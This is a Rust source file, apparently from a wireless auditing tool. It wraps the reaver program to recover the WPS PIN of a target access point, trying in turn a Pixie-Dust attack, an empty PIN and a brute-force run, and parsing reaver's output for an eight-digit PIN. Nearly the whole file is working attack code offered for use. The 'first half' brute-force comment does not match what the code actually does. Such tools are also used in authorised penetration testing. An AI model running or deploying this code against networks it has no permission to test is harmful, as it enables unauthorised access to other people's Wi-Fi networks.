// src/wps.rs - WPS testing (Pixie-Dust, brute force)
use std::process::Command;

pub type WpsCallback = Box<dyn FnMut(String, String, u8) + Send>;
pub type LogCallback = Box<dyn FnMut(i32, String) + Send>;

pub struct WpsTester {
    interface: String,
    target_bssid: String,
    channel: u8,
    running: bool,
}

impl WpsTester {
    pub fn new(interface: String, target_bssid: String, channel: u8) -> Self {
        Self {
            interface,
            target_bssid: target_bssid.to_lowercase(),
            channel,
            running: false,
        }
    }

    pub fn start(&mut self, mut callback: WpsCallback, mut log: LogCallback) -> Result<(), String> {
        self.running = true;
        
        super::scan::set_channel_system(&self.interface, self.channel)
            .map_err(|e| format!("Failed to set channel: {}", e))?;

        log(1, format!("Starting WPS test for {} on channel {}", self.target_bssid, self.channel));

        // Try Pixie-Dust attack first (reaver with -K 1)
        if let Ok(pin) = self.try_pixie_dust(&mut log) {
            callback(self.target_bssid.clone(), pin, 1); // 1 = Pixie-Dust
            return Ok(());
        }

        // Try null PIN
        if let Ok(pin) = self.try_null_pin(&mut log) {
            callback(self.target_bssid.clone(), pin, 3); // 3 = Null PIN
            return Ok(());
        }

        // Try brute force (first half)
        if let Ok(pin) = self.try_brute_force(&mut log) {
            callback(self.target_bssid.clone(), pin, 2); // 2 = Brute force
            return Ok(());
        }

        log(2, "WPS PIN not recovered".to_string());
        Ok(())
    }

    fn try_pixie_dust(&self, log: &mut LogCallback) -> Result<String, String> {
        log(1, "Attempting Pixie-Dust attack...".to_string());
        
        // Use reaver with Pixie-Dust (-K 1)
        let output = Command::new("reaver")
            .args([
                "-i", &self.interface,
                "-b", &self.target_bssid,
                "-c", &self.channel.to_string(),
                "-K", "1",
                "-vv",
            ])
            .output()
            .map_err(|e| format!("Failed to execute reaver: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        
        // Parse output for PIN
        for line in stdout.lines() {
            if line.contains("WPS PIN:") || line.contains("PIN:") {
                if let Some(pin) = line.split_whitespace().find(|s| s.len() == 8 && s.chars().all(|c| c.is_ascii_digit())) {
                    log(1, "Pixie-Dust succeeded; PIN delivered securely".to_string());
                    return Ok(pin.to_string());
                }
            }
        }

        Err("Pixie-Dust failed".to_string())
    }

    fn try_null_pin(&self, log: &mut LogCallback) -> Result<String, String> {
        log(1, "Trying null PIN...".to_string());
        
        let output = Command::new("reaver")
            .args([
                "-i", &self.interface,
                "-b", &self.target_bssid,
                "-c", &self.channel.to_string(),
                "-p", "", // Empty PIN
                "-vv",
            ])
            .output()
            .map_err(|e| format!("Failed to execute reaver: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        
        for line in stdout.lines() {
            if line.contains("WPS PIN:") {
                if let Some(pin) = line.split_whitespace().find(|s| s.len() == 8 && s.chars().all(|c| c.is_ascii_digit())) {
                    log(1, "Null PIN test succeeded; PIN delivered securely".to_string());
                    return Ok(pin.to_string());
                }
            }
        }

        Err("Null PIN failed".to_string())
    }

    fn try_brute_force(&self, log: &mut LogCallback) -> Result<String, String> {
        log(1, "Starting brute force (first half)...".to_string());
        
        // This is very slow, just attempt first 10000
        let output = Command::new("reaver")
            .args([
                "-i", &self.interface,
                "-b", &self.target_bssid,
                "-c", &self.channel.to_string(),
                "-d", "5", // Delay
                "-l", "100", // Lockout retry
                "-vv",
            ])
            .output()
            .map_err(|e| format!("Failed to execute reaver: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        
        for line in stdout.lines() {
            if line.contains("WPS PIN:") {
                if let Some(pin) = line.split_whitespace().find(|s| s.len() == 8 && s.chars().all(|c| c.is_ascii_digit())) {
                    log(1, "WPS test succeeded; PIN delivered securely".to_string());
                    return Ok(pin.to_string());
                }
            }
        }

        Err("Brute force failed or timed out".to_string())
    }
}
